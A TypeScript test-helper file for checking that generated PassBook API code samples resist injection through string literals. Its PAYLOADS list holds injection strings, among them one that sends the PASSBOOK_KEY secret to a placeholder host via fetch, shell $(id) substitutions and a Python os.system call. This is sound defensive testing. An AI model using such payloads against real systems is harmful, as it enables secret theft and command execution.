import { spawnSync } from 'node:child_process';
import type { Json } from './types.ts';

/**
 * Test helpers: what a sample is made of once its string literals are taken out, and the samples
 * actually run. If a value could end a literal and become code, the pieces outside the literals
 * would differ from the same sample with a harmless value, or the run would do something else.
 */

/** What a reader types, or a link carries, to turn a value into code. */
export const PAYLOADS = {
  ts: "'); fetch('https://x'+process.env.PASSBOOK_KEY); ('",
  tsBackslash: "\\'); fetch('https://x'); ('",
  // Joined, so the linter does not read the placeholder as a mistake: it is the point.
  tsTemplate: ['`$', '{process.env.PASSBOOK_KEY}`'].join(''),
  go: '"; os.Exit(1); x := "',
  goRaw: '` + os.Getenv("PASSBOOK_KEY") + `',
  goBackslash: 'C:\\temp\\"',
  shell: '$(id)',
  shellQuote: "'; id; '",
  shellTick: '`id`',
  py: '"""; import os; os.system("id"); """',
  pyF: "{os.environ['PASSBOOK_KEY']}",
  odd: 'line\nbreak \u2028 \u0000 \ufeff \ud800 end \\ud800',
} as const;

type Quote = { open: string; escapes: boolean; multiline: boolean };

/** Reads one string literal starting at `at` (the opening quote); returns the index after it. */
function readString(code: string, at: number, q: Quote): number {
  let i = at + 1;
  while (i < code.length) {
    const c = code[i];
    if (q.escapes && c === '\\') {
      i += 2;
      continue;
    }
    if (c === q.open) return i + 1;
    if (c === '\n' && !q.multiline) throw new Error(`Unterminated string at ${at}.`);
    i += 1;
  }
  throw new Error(`Unterminated string at ${at}.`);
}

interface Rules {
  strings: Record<string, Quote>;
  comment: string | null;
}

const RULES: Record<'ts' | 'py' | 'go' | 'curl', Rules> = {
  ts: {
    strings: {
      "'": { open: "'", escapes: true, multiline: false },
      '"': { open: '"', escapes: true, multiline: false },
      '`': { open: '`', escapes: true, multiline: true },
    },
    comment: '//',
  },
  py: {
    strings: {
      '"': { open: '"', escapes: true, multiline: false },
      "'": { open: "'", escapes: true, multiline: false },
    },
    comment: '#',
  },
  go: {
    strings: {
      '"': { open: '"', escapes: true, multiline: false },
      '`': { open: '`', escapes: false, multiline: true },
    },
    comment: '//',
  },
  curl: {
    strings: {
      "'": { open: "'", escapes: false, multiline: true },
      '"': { open: '"', escapes: true, multiline: true },
    },
    comment: null,
  },
};

/**
 * The sample with every string literal replaced by `S` and whitespace dropped. Throws when a
 * literal is not closed. Adjacent literals (Go's `+`, the shell's `'\''`) read as one.
 */
export function shapeOf(lang: keyof typeof RULES, code: string): string {
  const rules = RULES[lang];
  let out = '';
  let i = 0;
  while (i < code.length) {
    const c = code[i] as string;
    const q = rules.strings[c];
    if (q) {
      // In the shell a double-quoted word is a constant of ours (the key, the idempotency key): keep it.
      const end = readString(code, i, q);
      out += lang === 'curl' && c === '"' ? code.slice(i, end) : 'S';
      i = end;
      continue;
    }
    if (lang === 'curl' && c === '\\') {
      // A backslash-newline continues the line; a backslash-quote is a literal quote of the same word.
      out += code[i + 1] === "'" ? 'S' : '';
      i += 2;
      continue;
    }
    if (rules.comment && code.startsWith(rules.comment, i)) {
      const nl = code.indexOf('\n', i);
      out += 'COMMENT';
      i = nl === -1 ? code.length : nl;
      continue;
    }
    if (!/\s/.test(c)) out += c;
    i += 1;
  }
  return out.replace(/S(\+?S)+/g, 'S');
}

/**
 * Runs the TypeScript sample with `@passbook/sdk` and `fetch` replaced by recorders; returns every
 * call as the request it stands for: the method, the key in the Authorization header, the body.
 */
export async function runTs(
  code: string,
  secret: string,
): Promise<
  { url: string; init: { method: string; headers: Record<string, string>; body?: string } }[]
> {
  const calls: { url: string; init: never }[] = [];
  const makePassBook = (opts: { apiKey: string }) => {
    const call = (path: string[]): never =>
      new Proxy(() => undefined, {
        get: (_, key: string) => call([...path, key]),
        apply: async (_, __, args: unknown[]) => {
          const body = args[0] === undefined ? undefined : JSON.stringify(args[0]);
          const headers = { Authorization: `Bearer ${opts.apiKey}` };
          calls.push({ url: path.join('.'), init: { method: 'POST', headers, body } as never });
          return {};
        },
      }) as never;
    return call([]);
  };
  const fetchRecorder = async (url: string, init: { headers: Record<string, string> }) => {
    calls.push({ url, init: init as never });
    return { status: 200, json: async () => ({}) };
  };
  const AsyncFunction = Object.getPrototypeOf(async () => {}).constructor as new (
    ...args: string[]
  ) => (...args: unknown[]) => Promise<void>;
  const run = new AsyncFunction(
    'makePassBook',
    'process',
    'console',
    'fetch',
    'readFile',
    code.replace(/^import .*$/gm, '').replace('new PassBook(', 'makePassBook('),
  );
  await run(
    makePassBook,
    { env: { PASSBOOK_KEY: secret } },
    { log: () => undefined },
    fetchRecorder,
    async () => '',
  );
  return calls as never;
}

/** Runs the curl sample in `sh` with curl and `id` replaced; returns curl's arguments and stdout. */
export function runSh(
  code: string,
  secret: string,
): { args: string[]; stdout: string; status: number | null } {
  const script = [
    'curl() { for a in "$@"; do printf "ARG:%s\\0" "$a"; done; }',
    'RANDOM=1',
    'id() { echo INJECTED; }',
    `PASSBOOK_KEY=${secret}`,
    code,
  ].join('\n');
  const res = spawnSync('sh', ['-c', script], { encoding: 'utf8' });
  const parts = res.stdout.split('\0').filter(Boolean);
  return {
    args: parts.filter((p) => p.startsWith('ARG:')).map((p) => p.slice(4)),
    stdout: parts.filter((p) => !p.startsWith('ARG:')).join(''),
    status: res.status,
  };
}

/**
 * Runs the Python sample with `passbook` and `requests` replaced by recorders, when python3 is installed;
 * returns the body of the one call it makes (the SDK's first argument, or `json=`).
 */
export function runPy(code: string, secret: string): { ran: boolean; sent?: Json } {
  const prog = [
    'import sys, types, json, os',
    'sent = []',
    'class Rec:',
    '    def __getattr__(self, name): return Rec()',
    '    def __call__(self, *args, **kw):',
    '        sent.append(args[0] if args else None); return {}',
    'def PassBook(api_key=None): return Rec()',
    'class Res:',
    '    status_code = 200',
    '    def raise_for_status(self): pass',
    '    def json(self): return {}',
    'def http(*args, **kw):',
    '    sent.append(kw.get("json"))',
    '    return Res()',
    'sys.modules["passbook"] = types.SimpleNamespace(PassBook=PassBook)',
    'sys.modules["requests"] = types.SimpleNamespace(get=http, post=http, put=http, patch=http, delete=http)',
    `os.environ["PASSBOOK_KEY"] = ${JSON.stringify(secret)}`,
    'exec(compile(sys.stdin.read(), "sample.py", "exec"))',
    'sys.stderr.write(json.dumps(sent))',
  ].join('\n');
  const res = spawnSync('python3', ['-I', '-c', prog], { input: code, encoding: 'utf8' });
  if (res.error) return { ran: false };
  if (res.status !== 0) throw new Error(`python3 refused the sample: ${res.stderr}`);
  const sent = JSON.parse(res.stderr) as Json[];
  return { ran: true, sent: sent[0] as Json };
}

/** The value of the Go `json.Unmarshal([]byte(<expr>), &body)` or `strings.NewReader(<expr>)` expression: raw strings and `"…"` joined by `+`. */
export function goBody(code: string): string {
  const marker = ['json.Unmarshal([]byte(', 'strings.NewReader('].find((m) => code.includes(m));
  if (!marker) throw new Error('No body.');
  const at = code.indexOf(marker);
  let i = at + marker.length;
  let out = '';
  for (;;) {
    const c = code[i];
    if (c === '`') {
      const end = code.indexOf('`', i + 1);
      out += code.slice(i + 1, end);
      i = end + 1;
    } else if (c === '"') {
      const end = readString(code, i, { open: '"', escapes: true, multiline: false });
      out += JSON.parse(code.slice(i, end)) as string;
      i = end;
    } else throw new Error(`Unexpected ${c} in the Go body.`);
    while (code[i] === ' ') i += 1;
    if (code[i] === '+') {
      i += 1;
      while (code[i] === ' ') i += 1;
    } else return out;
  }
}
